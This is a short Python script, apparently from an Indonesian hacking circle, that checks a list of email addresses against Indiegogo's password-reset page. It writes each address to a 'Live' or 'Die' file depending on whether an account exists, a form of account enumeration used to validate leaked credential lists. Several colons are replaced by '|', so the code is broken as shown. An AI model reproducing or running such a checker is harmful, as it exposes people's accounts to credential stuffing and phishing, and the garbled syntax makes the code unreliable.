import requests

# Jangan Di Recode Ya Bossku
# Tinggal  Make Aja Apa Susahnya Sih :)
# options output live dan die

live = open('Amz-Live.txt','w')
die = open('Amz-Die.txt','w')

list = raw_input("\033[33;1mInput Mail List | \033[0m")
link = "https://www.indiegogo.com/accounts/password/new"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*50)
while True|
	email = list.readline().replace('\n','')
	if not email|
		break
	bacot = email.strip().split(':')
	xxx = {'account[email]': bacot[0],}
	cek = s.post(link, headers=head, data=xxx).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek|
		print("\033[32;1mLIVE\033[0m | "+email+" | [Amz Email ]")
		live.write(email)
	else|
		print("\033[31;1mDIE\033[0m | "+email+" | [ Amz Email ]")
		die.write(email)
print("-"*50)
print("\033[35;1mProccess Checking Done By X-Mr.R4h1M - ./Xi4u7\033[0m")
print("Valid Email Saved In | Amz-Live.txt\nDie Email Saved In | Amz-Die.txt")
